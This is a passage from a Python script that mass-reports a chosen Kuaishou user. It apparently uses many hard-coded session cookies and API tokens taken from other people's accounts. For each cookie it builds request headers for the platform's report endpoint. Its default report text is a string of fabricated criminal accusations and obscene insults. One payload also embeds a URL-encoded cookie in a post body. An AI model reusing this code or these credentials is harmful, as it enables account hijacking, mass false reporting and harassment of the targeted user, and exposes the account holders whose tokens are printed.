kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAYkFarYVg-Cb_nEDSth45Lo3Lpy2xFYM-zrk2Pr50BCp3qc-vmYY_AI64Bg4buvRuPtZVuFs7DtfJy5qZad9q_MXBE3hzFCOH5WekoBx7cx9TFlCMxm4zmTpX_mtP_V_zyFfha94G0aWqeyGy_1JrhBtBnEHV844-n6T2cy9HK6PMDSjponYbbX8qvTiOYJmS0x0HE4wIvGJZsgyx8B4_SoaEjzXXh-w5KSBpkEgON-CMTK0tiIgyQpsTHETX3ZDZGIBB9OfQEZ7Ga6alxAyIKaUjJo154soBTAB; ll_client_time=1720726589074; net=WIFI; lkvr=R83MlKQpRHLLmHDbogKmXzoFG38P0Dp1J_3YR-SOaHJlR8n48yiTI1Q6iu3gUUCnLcX2Iw; sid=a4117194-fe23-48e3-b5c6-98d8baa358e4; cold_launch_time_ms=1720780151571'

    Cookie51 = 'kpn=KUAISHOU; kpf=ANDROID_PHONE; userId=4091618506; did=ANDROID_fceab8159f3b5974; c=OPPO; ver=12.5; appver=12.5.20.36836; language=zh-cn; countryCode=CN; sys=ANDROID_13; mod=realme%28RMX3366%29; deviceName=realme%28RMX3366%29; earphoneMode=1; isp=; ud=4091618506; did_tag=0; egid=DFP02D1C3F7C243A2D52E77528B4ADDACDEA7E09B79D52802351E8FC0B3BBB5F; thermal=10030; kcv=1571; app=0; bottom_navigation=false; android_os=0; oDid=ANDROID_a218739338c91d92; boardPlatform=kona; newOc=OPPO; androidApiLevel=33; slh=0; country_code=cn; nbh=48; hotfix_ver=; did_gt=1713097241777; cdid_tag=2; max_memory=384; oc=OPPO; sh=2400; deviceBit=0; browseType=4; ddpi=480; socName=Qualcomm+Snapdragon+8250; is_background=0; sw=1080; ftt=; abi=arm64; cl=0; userRecoBit=0; device_abi=arm64; icaver=1; totalMemory=11485; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_32163225bcef79a7; sbh=101; darkMode=true; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAFWfEJbHfJAmFg8Xh4hIoWkgZ6Q1lE_BS7L3MttPHT_dePZF2GJmKNfPa1h5ZG57xIXBvFOzL7PynyKLiIerIC99caYmjSO3Zb1fPAz7lgsFexrLua85b5G3IfY48oWgmffw1fxthVcwllYItB8J99tQkCuJ9OEG4RrHXYeGAEoCfPHs2s7me2PJaz1-ozhRIVo4G0ZW4ljycur6mI7iEuWGhKBn81trpJKB6BrmlxeXw7Wm2EiIIuE1Dg8L0N9OWj1NiZtSpnsgVg4ozQhiyt6im_-2PT5KAUwAQ; token=65faf2be858a4a1e8cd7f6acc33388e9-4091618506; __NSWJ=; client_key=3c2cd3f3; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAXPmgCb2EhzOTnlEDl-bpn73_hFxOv2V_CwJuk77lJqdcmk5UNK6ANJAaIswUbVg3TQvET6jQkGl42Y91nB-vVqwZDdGUeEV0eu7FVE7PrbXYvevyfPFEsMqs59RQQHdoW0ano-XmRe14gEfP9FVO3E0c-epvBiZca1Mi8PPRqSVph5WDZ0CL5Lu7DfQHUop4Gln28_3ocNqaNlV8LAJjSwaEvQMzUXuEHBlR1EcMZxj9QIq6SIgInvvvgF4TDZ7Wom7EcU5qCmFy_s3SibFH6HOXYrn6ycoBTAB; keyconfig_state=2; net=4G; sid=c8253c01-1b2b-4d63-9ef2-1fde1681c007; cold_launch_time_ms=172077649715'

    Cookie52 = 'kpn=KUAISHOU; kpf=ANDROID_PHONE; userId=4231809077; did=ANDROID_7e6821dba409ea22; c=VIVO; ver=12.6; appver=12.6.10.8182; language=zh-cn; countryCode=CN; sys=ANDROID_14; mod=vivo%28V2055A%29; deviceName=vivo%28V2055A%29; earphoneMode=1; isp=CTCC; ud=4231809077; did_tag=0; egid=DFP2958E4BBCCF4DE5AE91D95FFBE7985C111217BD3D47B6F8C4A146BC440F73; thermal=10000; kcv=1571; app=0; bottom_navigation=true; android_os=0; oDid=ANDROID_7e6821dba409ea22; boardPlatform=kona; newOc=VIVO; androidApiLevel=34; slh=0; country_code=cn; nbh=118; hotfix_ver=; did_gt=1719137274946; keyconfig_state=2; cdid_tag=7; max_memory=256; oc=VIVO; sh=2400; deviceBit=1; browseType=3; ddpi=450; socName=Qualcomm+Snapdragon+8250; is_background=0; sw=1080; ftt=; apptype=22; abi=arm64; cl=0; userRecoBit=0; device_abi=arm64; icaver=1; totalMemory=7598; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_a87fa553fe2f0e6d; sbh=79; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAHHu_xJDQJlkWVaQwcfV8uc-mAni5XwCeZgIpSeP2KhFW2lEBuBodyPKIaZaWAU9Ebun7a39JlZNQrIKnpGQOVbEnOFNURNejWuY4t4GWNzVQM2oJTX30EH6qOdLE_2y_Nl6JPaYbCblXDEjQzYwqUmJQ2IaMLiJQgQ9G1sI1UZiwgrdMAjxgQCgXjdlcIhf4aOjMbuevFn7aLuqcbiAvzVGhJXa5y3Gp9GOYdlC6C2E2N1_EwiIAWwnhY16OD-pvCJyjzZ1H_9V8tBTI6vLFUKBeri44ruKAUwAQ; token=Cg9rdWFpc2hvdS5hcGkuc3QSoAHHu_xJDQJlkWVaQwcfV8uc-mAni5XwCeZgIpSeP2KhFW2lEBuBodyPKIaZaWAU9Ebun7a39JlZNQrIKnpGQOVbEnOFNURNejWuY4t4GWNzVQM2oJTX30EH6qOdLE_2y_Nl6JPaYbCblXDEjQzYwqUmJQ2IaMLiJQgQ9G1sI1UZiwgrdMAjxgQCgXjdlcIhf4aOjMbuevFn7aLuqcbiAvzVGhJXa5y3Gp9GOYdlC6C2E2N1_EwiIAWwnhY16OD-pvCJyjzZ1H_9V8tBTI6vLFUKBeri44ruKAUwAQ; __NSWJ=; client_key=2ac2a76d; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAU-md7GmHvMQbeEInX1bcJ5jsMpX9XQu7h9KzU9shXJd_okxWzu4v4BnqAGg88yxrOcA1qmN_r3IVE-eBlYBbDmVYyhbnZtCst8fhtNvAUaPXToY6jNqCwfSstglrYm2cSHSBy0fY7YifZwZv0Suw886JDuO8Yzi5DPeLgU7PQbM_cJWoTw9UR9MRrGbuOmcxgVQExQmRhXP8dzVksXcmKQaEqxPzmOMVKLWJx90RQamTgOk4SIg7lb1I0ePl7i7maeTj-DY6VRubRCKzpaKHFmE4348kMooBTAB; sid=b223afd7-0ee4-4ec9-9403-59ea183873e8; cold_launch_time_ms=1720775763021; net=5G'

    Cookie53 = 'kpn=KUAISHOU; kpf=ANDROID_PHONE; userId=2429018354; did=ANDROID_7b0f045ff4c44ba2; c=OPPO; ver=12.4; appver=12.4.40.36654; language=zh-cn; countryCode=CN; sys=ANDROID_10; mod=OPPO%28PCAM10%29; net=4G; deviceName=OPPO%28PCAM10%29; earphoneMode=1; isp=CMCC; ud=2429018354; did_tag=0; egid=DFP8CE0E85870A50F97C38FD6201C6358CED9486563EA394EC87539B0A50B8F6; thermal=10000; kcv=1571; app=0; bottom_navigation=false; android_os=0; oDid=ANDROID_bde93fbd1691292e; boardPlatform=mt6771; newOc=OPPO; androidApiLevel=29; slh=0; country_code=cn; nbh=132; hotfix_ver=; did_gt=1719542415260; keyconfig_state=2; cdid_tag=2; max_memory=384; sid=4d6cee12-c92f-40d2-a994-13395d6c9a68; cold_launch_time_ms=1720789615043; oc=OPPO; sh=2340; deviceBit=0; browseType=4; ddpi=480; socName=MediaTek+MT6771V%2FCT; is_background=0; sw=1080; ftt=R-T-T; abi=arm64; cl=0; userRecoBit=0; device_abi=arm64; icaver=1; totalMemory=3656; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_4deac49ddc276386; sbh=96; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAG7KLEFWcweBKpniG00wwX4_A_vfMb3m9V1JBy5ZndgkgLEmgXAtONLFXJNDXUve4VEGuV5zECvXbDEKoXXM1nDEPVtdkDtRLNImd7dA7DSDtnUsCFHyefIGFxnQ0-jIlL8aWpLaRN5cJ1Cjijz2mpJ4Jnmi6sQRhtIk2Ix773cNqHFuBIKG6VsaylZgMTnjULk0PA3F0-H4mdalf5tQWjGGhJDuMiqtgZPubHrzEMdgDufEMEiIEdVC_xANdqmWa78wpVB2hksYPGWxll_-wROcyq3RUoCKAUwAQ; token=a769cad01d4c4386a9c5f420692d076c-2429018354; __NSWJ=; client_key=3c2cd3f3; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAef2xEhDhtR-XYLw8AegfHdzhBlOHBXc7g7pBM1yLCwfHNHwlLs4oCZWZiC3TwcGRZmuDvxSc6t_rD64JUYWQlZ3_LuMJgI6JPk8jtsjFOidRn-bNZ_1LiTfGPhb1uWNeZZQxEyTXD5LTnpy0sIp4OVIV4ZYf93AKwtFM4V_BNm5h8h3UlqwHJ6UY4iCZzsUrGvKNf_rTRH45Rc6dNejaWsaEn0DMNGTGbtZm1-Kfj1W_J6I5SIgMdhDzwGOTYoeJ9Hntf8NVAVPDlpOvUuzl5oYANcsC2QoBTAB'

    Cookie54 = 'kpn=NEBULA; kpf=ANDROID_PHONE; userId=4115208604; did=ANDROID_c15b179399dd28bf; c=MYAPP%2C1; ver=12.5; appver=12.5.40.8118; language=zh-cn; countryCode=CN; sys=ANDROID_12; mod=OPPO%28PERM00%29; net=WIFI; deviceName=OPPO%28PERM00%29; earphoneMode=1; isp=; ud=4115208604; did_tag=0; egid=DFP305E50A1FDB9F68E312E467DE5EB0C991E9C1E3848E5CB8EE51607D0D2553; thermal=10000; kcv=1571; app=0; bottom_navigation=true; android_os=0; oDid=ANDROID_dbc202cf836b79e9; boardPlatform=mt6853; newOc=MYAPP%2C1; androidApiLevel=31; slh=0; country_code=cn; nbh=41; hotfix_ver=; did_gt=1720256453348; cdid_tag=7; max_memory=256; oc=MYAPP%2C1; sh=2400; deviceBit=2; browseType=3; ddpi=408; socName=MediaTek+MT6853V%2FZA; is_background=0; sw=1080; ftt=; apptype=22; abi=arm64; cl=0; userRecoBit=0; device_abi=arm64; ll_client_time=1720695607430; icaver=1; totalMemory=5545; grant_browse_type=AUTHORIZED; iuid=; rdid=ANDROID_3c8d373081956f99; sbh=115; darkMode=false; kuaishou.api_st=Cg9rdWFpc2hvdS5hcGkuc3QSoAFObqjdmKbn0saRE3XSdx6T-PvwpyOrleN8bq6mNKK83LAnrziGm7MIVo5W8rm56qCdVcCby5MM8nkljkBXm7YhQS0zWprmTG6dHX7jcnAOchACIterboDHKGaDsyUgjfbzRuRgRJqUW-YTzvtEglqQt4oqcIkCn4h8nEpaqezmfbNBLq2aCD_vnnWBtYqxKhQy3-8mz4zl68WId8blaLcfGhIBsEvrYUJIEr3QAbL9uj1zIhsiIByklp2MOskRBBtj-Tvds9R4sW_z4N2SJ1mqR5dHOlYZKAUwAQ; token=Cg9rdWFpc2hvdS5hcGkuc3QSoAFObqjdmKbn0saRE3XSdx6T-PvwpyOrleN8bq6mNKK83LAnrziGm7MIVo5W8rm56qCdVcCby5MM8nkljkBXm7YhQS0zWprmTG6dHX7jcnAOchACIterboDHKGaDsyUgjfbzRuRgRJqUW-YTzvtEglqQt4oqcIkCn4h8nEpaqezmfbNBLq2aCD_vnnWBtYqxKhQy3-8mz4zl68WId8blaLcfGhIBsEvrYUJIEr3QAbL9uj1zIhsiIByklp2MOskRBBtj-Tvds9R4sW_z4N2SJ1mqR5dHOlYZKAUwAQ; __NSWJ=; client_key=2ac2a76d; kuaishou.h5_st=Cg5rdWFpc2hvdS5oNS5zdBKgAR0Q0A-BCooM5qCsOaVyUlYaUKSsNBQsUClFA5E9fB8mNsfpjphWWazsUq6DoE1Kgh4w-qXg9TR9DMEuDnC9BBFN5qMOrGECL_MNqAMc9dyicAhss5JL7Yfd9v9ds2g7y9ngASXQWVybG35A8f5jBQuZoXlVTZ-dV_aYCA_5SgXxyTMbt0Hpae5FPpkkuZj-E0ovc3KyQAAb-y_0e6UqwTAaElvrn4oKoX95QYHbaBfIBtv_wiIgFRMVCc_Tp9Qj8Y6zG3Yg53xO3vfX_3wrFE4xqH_9nQwoBTAB; keyconfig_state=1; lkvr=_VSdHPljWksjQ6Ktjapb32utA9JUgykx_jI8HdtPt7DKwtCwr_9T9B7jXatnRwQOGgu1zQ; sid=47deb854-74ba-489d-a892-f66dca99c3c6; cold_launch_time_ms=1720794029789'
    url = "https://app.m.kuaishou.com/rest/wd/ztReport/user/report/aggregation/v2"
    print(green + '伏笔牛逼' + redd)
    print(
        red + '↓↓↓↓ 没没有Cookie的可以在快手打开下方链接抓取↓↓↓↓↓↓\n    https://api3.gifshow.com/rest/nebula/system/stat\n' + redd)
    idcard = input("请输入要举报快手原id：")
    from urllib.parse import quote
    text = Cookie
    encoded_text = quote(text)
    Cookiee = encoded_text
    payload1 = f"access_key=492b88b378047e0b380d667934a0c571CjAKGsI14ux7dZtKIvyMVLUGeZ8vTDhi0fn9KpzLCnX6rgEpFlWHFpJw5cJKlisbDM0SVjY5eEJSQUlaRHRkTnNQOWVET2M2Sk5qbFJJSjdlaHY5MEE4MW95VTZSeUZfWTUtejIxUmo5bXNxakJURG8yNy1sSHA3WjZqRGJOS0J4UTNCbFlEMWp3IIEC&appkey=1d8b6e7d45233436&banner_url=&category=15&comment_selected=0&content=%7B%22ops%22%3A%5B%7B%22insert%22%3A%22{Cookiee}%5Cn%22%7D%5D%7D&csrf=c2511edb8246217fd7cee15c11225d74&disable_rcmd=0&image_urls=&list_id=0&media_id=&mobi_app=android&origin_image_urls=&original=0&platform=android&reprint=0&spoiler=&statistics=%7B%22appId%22%3A1%2C%22platform%22%3A3%2C%22version%22%3A%227.78.0%22%2C%22abtest%22%3A%22%22%7D&summary={Cookiee}&tid=1&title=%E7%BE%BD%E8%90%BD&top_video_bvid=&ts=1720683474&type=3&up_reply_closed=0&w_rid=2cb4dbd6b3dfb51fbca5af0f57d125f0&words=23&wts=1720683474&sign=f805a662ee126c6afafb199006f54c94"
    LYOU = input('输入举报理由<不输入则默认为直举代码>  (伏笔提醒您：这个几把功能用不了)：')

    if LYOU.upper() == "":
        LY = (
            r'�贩卖军火�炸金花��涉嫌赌博׻�和习近平他妈操逼�H4j�此人贩卖鸡腿外挂� �涉嫌贩毒�企图分裂中国�带人强奸习近平�殴打毛泽东��企图分裂台湾�:x6��此人洗钱多次l�n0"�与他人玩六合彩�吃野生熊猫@�r�此人天天和习近平玩老虎机�T�_C�贩卖枪支�泄露国家机密�内射毛泽东妈妈�支付宝口令洗钱�/强奸幼女�与婴儿强行发生关系�bl�涉嫌吸毒贩卖毒品�与毛泽东发生性关系�g!D�h��3�CJ�此人应永久封禁�天天操习近平妈�by羽落给我一个面子'[
            :-1])
    else:
        LY = (LYOU)

    refer = f"ks://profile/{idcard}/null/null"
    Referer = f"https://app.m.kuaishou.com/report-v2/index.html?sourceType=user&liveStreamId=&refer=ks%3A%2F%2Fprofile%2F{idcard}%2Fnull%2Fnull&prerefer=&reportType=&voicePartyId=&reportSource=&negativeSource=&reportedUserId={idcard}&exp_tag=&&entrySource=userReportShunt"
    payload = json.dumps({
        "sourceType": "user",
        "liveStreamId": "",
        "refer": refer,
        "prerefer": "",
        "reportType": 215,
        "voicePartyId": "",
        "reportSource": "",
        "negativeSource": "",
        "reportedUserId": idcard,
        "exp_tag": "",
        "user_id": "4237214509",
        "entrySource": "userReportShunt",
        "illegalContent": [
            8
        ],
        "leadToFraud": True,
        "hasFraudConfirm": False,
        "descriptionPasteContent": "",
        "descriptionIsPaste": 0,
        "descriptionInputNum": 0,
        "detail": LY,
        "imageIds": [],
        "jsonExtParams": "{\"referUrl\":\"{\\\"category\\\":\\\"SEARCH\\\",\\\"entryPageId\\\":\\\"5dcc5e14-135f-4d4a-ba7e-1434abc0829f\\\",\\\"entryPageSource\\\":\\\"SEARCH\\\",\\\"identity\\\":\\\"2c471d85-7696-4832-8ad7-c0a8db582f86\\\",\\\"page\\\":\\\"UNKNOWN2\\\",\\\"page2\\\":\\\"USER_TAG_SEARCH\\\",\\\"pageSeq\\\":4,\\\"pageType\\\":\\\"NATIVE\\\",\\\"params\\\":\\\"{\\\\\\\"entry_source\\\\\\\":\\\\\\\"search_entrance_thanos_find\\\\\\\",\\\\\\\"query_id\\\\\\\":\\\\\\\"Mjc0ODI2MDk3NTQyMzcyMTQ1MDkxNzIwMzgxOTgyMjY1MTY0Mw\\\\u003d\\\\u003d\\\\\\\",\\\\\\\"query_name\\\\\\\":\\\\\\\"{idcard}\\\\\\\",\\\\\\\"query_source_type\\\\\\\":\\\\\\\"HISTORY\\\\\\\",\\\\\\\"query_source_list_id\\\\\\\":\\\\\\\"aGlzdG9yeTQyMzcyMTQ1MDkxNzIwMzgxOTc5NjQ0ODQy\\\\\\\",\\\\\\\"query_vertical_type\\\\\\\":\\\\\\\"SEARCH_PAGE\\\\\\\",\\\\\\\"sourceTraces\\\\\\\":\\\\\\\"{\\\\\\\\\\\\\\\"entry_refer_page2\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\"entry_source\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\"search_entrance_thanos_find\\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\"entry_style\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\"trace_list\\\\\\\\\\\\\\\":[{\\\\\\\\\\\\\\\"author_id\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\"1398778006\\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\"category\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\"create_page2\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\"THANOS_FIND\\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\"create_pag_depth\\\\\\\\\\\\\\\":-1,\\\\\\\\\\\\\\\"create_timestamp\\\\\\\\\\\\\\\":1720381978565,\\\\\\\\\\\\\\\"generate_from\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\"KS_TRACE_GENERATE_FROM_CLIENT\\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\"life_cycle\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\"photo_id\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\"5201376221966527948\\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\"trace_type\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\"KS_TRACE_TYPE_ENTRY_ID_INFO\\\\\\\\\\\\\\\"}]}\\\\\\\"}\\\",\\\"subPages\\\":\\\"\\\",\\\"topPage\\\":\\\"USER_TAG_SEARCH\\\"}\",\"referElement\":\"{\\\"action\\\":\\\"UNKNOWN2\\\",\\\"action2\\\":\\\"BASE_SUBCARD\\\",\\\"index\\\":0,\\\"name\\\":\\\"\\\",\\\"params\\\":\\\"\\\",\\\"status\\\":\\\"UNKNOWN2\\\",\\\"type\\\":\\\"UNKNOWN1\\\",\\\"value\\\":0.0}\",\"reportEntryTime\":1720382083673,\"reportSubmitTime\":1720382106133}",
        "expTag": ""
    })
    AAA = '"Mozilla/5.0 (Linux; Android 12; PERM00 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.226 KsWebView/1.8.90.700 (rel;r) Mobile Safari/537.36 Yoda/3.1.7-alpha34 ksNebula/12.5.40.8118 OS_PRO_BIT/64 MAX_PHY_MEM/5545 AZPREFIX/az1 ICFO/0 StatusHT/45 TitleHT/43 NetType/WIFI ISLP/0 ISDM/0 ISLB/0 locale/zh-cn DPS/5.41 DPP/37 CT/0 ISLM/0"'

    headers2 = {'User-Agent': AAA,
                'Accept': "application/json",
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/json;charset=UTF-8",
                'Origin': "https://app.m.kuaishou.com",
                'X-Requested-With': "com.kuaishou.nebula",
                'Sec-Fetch-Site': "same-origin",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': Referer,
                'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': Cookie
                }

    headers3 = {'User-Agent': AAA,
                'Accept': "application/json",
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/json;charset=UTF-8",
                'Origin': "https://app.m.kuaishou.com",
                'X-Requested-With': "com.kuaishou.nebula",
                'Sec-Fetch-Site': "same-origin",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': Referer,
                'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': Cookie2
                }

    headers4 = {'User-Agent': AAA,
                'Accept': "application/json",
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/json;charset=UTF-8",
                'Origin': "https://app.m.kuaishou.com",
                'X-Requested-With': "com.kuaishou.nebula",
                'Sec-Fetch-Site': "same-origin",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': Referer,
                'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': Cookie3
                }

    headers5 = {'User-Agent': AAA,
                'Accept': "application/json",
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/json;charset=UTF-8",
                'Origin': "https://app.m.kuaishou.com",
                'X-Requested-With': "com.kuaishou.nebula",
                'Sec-Fetch-Site': "same-origin",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': Referer,
                'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': Cookie4
                }

    headers6 = {'User-Agent': AAA,
                'Accept': "application/json",
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/json;charset=UTF-8",
                'Origin': "https://app.m.kuaishou.com",
                'X-Requested-With': "com.kuaishou.nebula",
                'Sec-Fetch-Site': "same-origin",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': Referer,
                'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': Cookie5
                }

    headers7 = {'User-Agent': AAA,
                'Accept': "application/json",
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/json;charset=UTF-8",
                'Origin': "https://app.m.kuaishou.com",
                'X-Requested-With': "com.kuaishou.nebula",
                'Sec-Fetch-Site': "same-origin",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': Referer,
                'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': Cookie6
                }

    headers8 = {'User-Agent': AAA,
                'Accept': "application/json",
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/json;charset=UTF-8",
                'Origin': "https://app.m.kuaishou.com",
                'X-Requested-With': "com.kuaishou.nebula",
                'Sec-Fetch-Site': "same-origin",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': Referer,
                'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': Cookie7
                }

    headers9 = {'User-Agent': AAA,
                'Accept': "application/json",
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/json;charset=UTF-8",
                'Origin': "https://app.m.kuaishou.com",
                'X-Requested-With': "com.kuaishou.nebula",
                'Sec-Fetch-Site': "same-origin",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': Referer,
                'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                'Cookie': Cookie8
                }

    headers10 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie9
                 }

    headers11 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie9
                 }

    headers12 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie10
                 }

    headers13 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie11
                 }

    headers14 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie12
                 }

    headers15 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie13
                 }

    headers16 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie14
                 }

    headers17 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie15
                 }

    headers18 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie16
                 }

    headers19 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie17
                 }

    headers20 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie18
